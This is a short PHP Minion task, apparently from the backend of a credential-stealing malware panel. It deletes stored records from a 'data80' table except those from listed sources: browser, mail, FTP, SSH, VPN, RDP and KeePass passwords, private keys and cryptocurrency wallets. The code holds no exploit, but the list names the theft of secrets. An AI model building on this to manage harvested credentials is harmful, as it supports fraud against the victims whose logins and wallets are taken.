<?php defined('SYSPATH') or die('No direct script access.');

class Task_Trash extends Minion_Task {

    private static $sources = [
            'IE passwords',
            'Edge passwords',
            'chrome passwords',
            'firefox passwords',
            'Outlook passwords',
            'FileZilla passwords',
            'WinSCP passwords',
            'PuTTY passwords',
            'VNC passwords',
            'RDP passwords',
            'SQLSCAN',
            'OWA passwords',
            'Precious files',
            'TV passwords',
            'bitcoin',
            'putty',
            'cert',
            'litecoin',
            'url passwords',
            'git passwords',
            'OpenVPN passwords and configs',
            'OpenSSH private keys',
            'KeePass passwords',
            'Precious files',
            'AnyConnect',
        ];

	protected function _execute(array $params){
        DB::delete('data80')
            ->where('source', 'NOT IN', self::$sources)
            ->execute();
    }
}